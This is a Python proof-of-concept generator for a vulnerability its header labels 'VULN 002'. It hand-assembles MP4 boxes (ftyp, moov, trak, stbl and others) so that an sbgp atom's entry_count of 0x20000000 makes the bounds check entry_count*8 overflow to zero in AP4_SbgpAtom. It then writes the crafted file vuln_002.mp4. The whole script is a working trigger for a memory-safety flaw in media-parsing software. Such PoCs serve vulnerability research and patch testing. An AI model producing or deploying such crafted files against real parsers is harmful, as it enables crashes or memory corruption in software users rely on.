#!/usr/bin/env python3
"""
VULN 002 PoC Generator
AP4_SbgpAtom – Integer overflow in bounds-check expression entry_count*8
Triggered via moov/trak/mdia/minf/stbl/sbgp with entry_count=0x20000000
"""

import struct
import os

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    return box(btype, struct.pack('>B', version) + struct.pack('>I', flags)[1:] + data)

# sbgp full atom (triggers the vulnerability)
entry_count = 0x20000000          # entry_count * 8 = 0x100000000 -> wraps to 0 (32-bit)
grouping_type = b'seig'
fake_entry = struct.pack('>II', 1, 1)  # 1 sample, group_desc_index=1
sbgp_data = grouping_type + struct.pack('>I', entry_count) + fake_entry
sbgp = full_box(b'sbgp', 0, 0, sbgp_data)

# stbl
stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + sbgp)

# dinf
url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)

# smhd
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))

# minf
minf = box(b'minf', smhd + dinf + stbl)

# mdhd
mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)

# hdlr
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)

# mdia
mdia = box(b'mdia', mdhd + hdlr + minf)

# tkhd
tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>II', 0, 0) + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)

# trak
trak = box(b'trak', tkhd + mdia)

# mvhd
mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 0xFFFFFFFF)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)

# moov
moov = box(b'moov', mvhd + trak)

# ftyp
ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

data = ftyp + moov

out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_002.mp4')
with open(out_path, 'wb') as f:
    f.write(data)

print(f"[+] PoC written to {out_path} ({len(data)} bytes)")
print(f"[+] entry_count = 0x{entry_count:08X} -> entry_count*8 = 0x{(entry_count*8) & 0xFFFFFFFF:08X} (32-bit overflow)")
